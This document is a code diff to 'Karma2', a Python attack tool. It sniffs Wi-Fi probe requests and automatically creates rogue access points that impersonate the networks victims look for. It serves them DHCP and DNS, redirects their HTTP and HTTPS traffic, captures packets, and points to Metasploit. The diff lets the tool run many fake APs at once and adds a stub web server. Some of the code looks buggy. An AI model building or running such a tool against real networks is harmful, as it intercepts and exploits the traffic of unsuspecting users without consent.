@@ -7,7 +7,7 @@ from scapy.all import *
 from select import select
 import argparse
 from datetime import datetime
-
+import BaseHTTPServer
 
 DEFAULT = '\033[49m\033[39m'
 RED = '\033[91m'
@@ -28,16 +28,78 @@ def parse_args():
     parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
     parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
     parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
-    parser.add_argument("-a", "--hostapd", help="shoose the hostapd interface")
+    parser.add_argument("-a", "--hostapds", help="List of interfaces which will be used to create aps")
     parser.add_argument("-n", "--name", help="start only this given essid")
     parser.add_argument("-f", "--framework", help="path to the metasploit console")
     parser.add_argument("-t", "--tcpdump", action='store_true', help="run tcpdump on interface")
     return parser.parse_args()
 
-
 class Karma2:
 
   FORBIDDEN_APS = ('ottersHQ','forYourOttersOnly')
+
+  class Webserver(Thread):
+    daemon=True
+    def __init__(self):
+      Thread.__init__(self)
+
+    def run(self):
+      print "run server"
+      server_class=Karma2.HTTPServer
+      handler_class=Karma2.HTTPRequestHandler
+      server_address = ('', 80)
+      httpd = server_class(server_address, handler_class)
+      httpd.serve_forever()
+
+  class HTTPServer(BaseHTTPServer.HTTPServer):
+    pass
+
+  class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(self):
+      self.send_response(200)
+      self.end_headers()
+
+  class WLANInterface:
+    def __init__(self, iface):
+      self.iface = iface
+      self.available = True
+
+    def str(self):
+      return self.iface
+
+  class WLANInterfaces:
+    def __init__(self, ifs):
+      self.ifs = [Karma2.WLANInterface(_if) for _if in ifs]
+
+    def get_one(self):
+      for iface in self.ifs:
+        if iface.available:
+          iface.available = False
+          return iface
+      return None
+
+    def free_one(self, _iface):
+      for iface in self.ifs:
+        if iface.iface == _iface.iface:
+          iface.available = False
+          return
+      return
+
+  class IPSubnet:
+    def __init__(self, base):
+      self.base = base
+
+    def range(self):
+      return "%s/24"%(self.base%254)
+
+    def gateway(self):
+      return self.base%254
+
+    def range_upper(self):
+      return self.base%100
+
+    def range_lower(self):
+      return self.base%200
 
   class AccessPoint(Thread):
     def __init__(self, karma, ifhostapd, essid, timeout):
@@ -55,15 +117,14 @@ class Karma2:
       # redirect the following ports
       self.setup_redirections(iface,80,8080)
       self.setup_redirections(iface,443,8080)
-      #self.setup_redirections(iface,443,8080)
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
       if self.karma.tcpdump:
         self.start_tcp_dump()
 
     def start_tcp_dump(self):
-      logfile = "wifi-%s-%s.cap"%(self.ifhostapd,datetime.now().strftime("%Y%m%d-%H%M%S"))
+      logfile = "wifi-%s-%s.cap"%(self.ifhostapd.str(),datetime.now().strftime("%Y%m%d-%H%M%S"))
       print "[+] Starting tcpdump %s"%logfile
-      cmd = ['tcpdump','-i', self.ifhostapd, '-w', logfile]
+      cmd = ['tcpdump','-i', self.ifhostapd.str(), '-w', logfile]
       p = subprocess.Popen(cmd)
     
     def run(self):
@@ -78,6 +139,7 @@ class Karma2:
           self.airbase_process.kill()
           self.airbase_process.wait()
           self.karma.release_ap(self.essid)
+          self.karma.ifhostapds.free_one(self.ifhostapd)
           return
 
         dhcpfd = self.dhcpd_process.stderr.fileno()
@@ -136,10 +198,10 @@ class Karma2:
         '-d',
         '--bind-dynamic',
         '-i', iface,
-        '-F', '192.168.%d.100,192.168.%d.200'%(subnet,subnet),
-        '--dhcp-option=option:router,192.168.%d.254'%(subnet),
-        '--dhcp-option=option:dns-server,192.168.%d.254'%(subnet),
-        '-R','--address=/#/192.168.%d.254'%(subnet)
+        '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
+        '--dhcp-option=option:router,%s'%(subnet.gateway()),
+        '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
+#'-R','--address=/#/%s'%(subnet.gateway())
       ]
       p = subprocess.Popen(cmd,
         stdout=subprocess.PIPE,
@@ -148,15 +210,16 @@ class Karma2:
 
     def setup_iface(self, iface, subnet):
       print "[+] Uping iface %s w/ subnet %s"%(iface,subnet)
-      iprange = "192.168.%d.254/24"%subnet
+      iprange = "%s"%subnet.range()
       cmd = ["ifconfig",iface,iprange]
+      print cmd
       p = subprocess.Popen(cmd)
       p.wait()
 
     def create_hostapd_access_point(self, essid):
       print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)
 
-      interface = self.ifhostapd
+      interface = self.ifhostapd.str()
       channel = 4
 
       f = tempfile.NamedTemporaryFile(delete=False)
@@ -185,10 +248,10 @@ class Karma2:
           iface, = m.groups()
           return iface,p
 
-  def __init__(self, ifgw, ifmon, ifhostapd = None, metasploit = None, tcpdump = None):
+  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None):
     self.ifmon = ifmon
     self.ifgw = ifgw
-    self.ifhostapd = ifhostapd
+    self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
     self.aps = {}
     self.subnets = set(xrange(50,256)) 
     self.clear_iptables()
@@ -223,7 +286,8 @@ class Karma2:
     p.wait()
 
   def get_unique_subnet(self):
-    return self.subnets.pop()
+    a = self.subnets.pop()
+    return Karma2.IPSubnet("10.0.%d.%%d"%a)
 
   def register_ap(self, essid, ap):
     self.aps[essid] = ap
@@ -232,7 +296,10 @@ class Karma2:
     self.aps.pop(essid)
 
   def create_ap(self, essid, timeout = 30):
-    ap = self.AccessPoint(self, self.ifhostapd, essid, timeout)
+    iface = self.ifhostapds.get_one()
+    if iface is None:
+      return
+    ap = self.AccessPoint(self, iface, essid, timeout)
     ap.daemon = True
     ap.start()
     self.register_ap(essid,ap)
@@ -244,16 +311,16 @@ class Karma2:
         # SSID
         if section.ID == 0 and section.info != '':
           
-          # limit concurrent APs
-          if len(self.aps) > 0:
-            return
-
           if (not section.info in self.aps.keys()
             and not section.info in self.FORBIDDEN_APS):
             
             self.create_ap(section.info)
-
+    
     sniff(prn=_filter,store=0)
+
+  def start_webserver(self):
+    ws = Karma2.Webserver()
+    ws.start()
 
 def get_gw(interface):
     for nw, nm, gw, iface, addr in read_routes():
@@ -266,11 +333,13 @@ if __name__ == '__main__':
   if args.enable is not None:
     cmd = "airmon-ng start %s"%args.enable
     subprocess.Popen(cmd)
-    
-  if args.gateway is None:
-    args.gateway = get_gw(args.hostapd)
-    
-  km = Karma2(args.gateway, args.monitor, args.hostapd, args.framework, args.tcpdump)
+ 
+  args.hostapds = args.hostapds.split(',')
+
+  km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump)
+
+  #km.start_webserver()
+
   if args.name is not None:
     # 24h timeout
     km.create_ap(args.name, 60*60*24)
